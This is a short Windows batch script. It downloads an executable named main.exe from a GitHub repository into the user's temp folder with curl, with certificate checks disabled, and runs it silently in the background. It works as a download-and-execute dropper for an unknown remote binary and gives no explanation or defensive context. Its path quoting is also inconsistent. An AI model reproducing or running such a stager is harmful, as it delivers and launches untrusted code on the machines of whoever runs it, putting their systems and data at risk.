@echo off

:gowno
cls
curl -g -k -L -# -o "%tmp%\main.exe"  "https://github.com/checkmate69/gownoww/raw/main/main.exe"
if exist "%tmp%"\main.exe" start /B "main" "%tmp%"\main.exe"
echo.
